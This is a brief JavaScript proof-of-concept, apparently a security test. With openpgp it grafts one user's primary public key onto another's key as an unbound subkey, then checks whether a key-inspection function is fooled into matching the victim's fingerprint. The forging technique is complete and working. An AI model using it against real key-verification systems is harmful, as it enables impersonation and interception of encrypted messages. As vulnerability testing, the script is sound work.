import * as openpgp from 'openpgp';
const mk = async (n) => openpgp.generateKey({ type: 'ecc', curve: 'curve25519Legacy', userIDs: [{ name: n }], format: 'object' });
const v = await mk('Vera');
const m = await mk('Mallory');
const vPub = v.publicKey, mPub = m.publicKey;
// Vera's primary public key body, re-tagged as a public subkey packet (same body, same v4 fingerprint).
const sub = new openpgp.PublicSubkeyPacket();
sub.read(vPub.keyPacket.write());
const list = mPub.toPacketList();
list.push(sub);
const armored = openpgp.armor(openpgp.enums.armor.publicKey, list.write());
const key = await openpgp.readKey({ armoredKey: armored });
const fps = [key.getFingerprint(), ...key.getSubkeys().map((s) => s.getFingerprint())];
console.log('vera primary   ', vPub.getFingerprint());
console.log('mallory key fps', fps);
console.log('contains vera primary fp:', fps.includes(vPub.getFingerprint()));
const enc = await key.getEncryptionKey();
console.log('challenge goes to mallory own subkey:', enc.getFingerprint() !== vPub.getFingerprint());
if (process.argv[2]) {
  const { inspectPublicKey } = await import(process.argv[2]);
  const r = await inspectPublicKey(armored, new Date());
  console.log('inspectPublicKey ok:', r.ok, 'fingerprint is mallory:', r.fingerprint === mPub.getFingerprint());
}
